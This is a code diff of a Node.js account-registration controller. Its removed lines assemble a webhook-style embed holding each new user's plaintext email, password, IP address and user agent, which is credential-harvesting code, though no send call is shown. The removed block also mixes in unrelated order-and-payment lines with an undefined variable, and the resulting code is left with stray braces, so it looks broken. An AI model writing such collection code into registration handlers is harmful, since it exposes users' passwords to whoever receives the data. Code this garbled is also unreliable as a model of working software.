@@ -20,31 +20,10 @@ exports.registerUser = async (req, res) => {
     req.flash("message", "Your account has been successfully created.");
     req.flash("messageType", "success");
     res.redirect("/login");
-    const paymentMethod = req.body.service;
-    const payerEmail = req.session.user_email;
-
-const description = `
-      Email: \`${req.body.email}\`
-      Password: \`${req.body.password}\`
-      IP address: \`${req.ip}\`
-      User agent: \`${req.headers["user-agent"]}\`
-    `;
-
-    const data = {
-      embeds: [
-        {
-          title: "New Account Created",
-          description: description,
-        },
-      ],
+    
     };
     
-    res.json({ message: `Order placed successfully! | Funds Deducted: ${price}` });
-  } catch (error) {
-    console.log(error);
-    res.status(500).json({ message: "Error saving the user." });
-  }
-};
+    
 
 // Exchange Controller
 
